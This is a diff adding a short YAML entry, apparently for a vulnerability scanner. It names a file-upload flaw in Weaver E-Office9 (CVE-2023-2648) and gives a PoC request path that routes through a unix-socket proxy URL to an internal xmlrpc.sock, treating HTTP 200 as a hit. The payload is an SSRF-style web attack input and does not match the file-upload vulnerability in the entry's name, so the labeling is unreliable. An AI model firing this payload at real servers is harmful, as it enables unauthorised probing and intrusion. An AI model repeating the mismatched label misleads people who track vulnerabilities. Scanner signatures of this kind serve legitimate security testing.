@@ -1,0 +1,3 @@
+name: "某微E-Office9文件上传漏洞 CVE-2023-2648"
+poc: "/service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc"
+status_code: 200
